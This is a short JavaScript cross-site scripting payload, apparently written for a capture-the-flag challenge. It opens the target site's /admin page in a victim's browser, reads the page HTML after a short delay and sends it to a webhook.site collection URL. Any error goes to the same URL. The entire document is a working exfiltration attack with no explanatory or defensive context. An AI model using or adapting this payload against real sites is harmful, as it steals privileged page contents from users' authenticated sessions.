function pwn() {
	const f = window.open("http://robo-xss-2025.onrender.com/admin", "_blank")
	setTimeout(() => {
		fetch("https://webhook.site/<redacted>/?s=" + encodeURIComponent(f.document.body.innerHTML))
	}, 400)
}

try {
    pwn()
} catch (err) {
    fetch("https://webhook.site/<redacted>/?s=" + encodeURIComponent(err))
}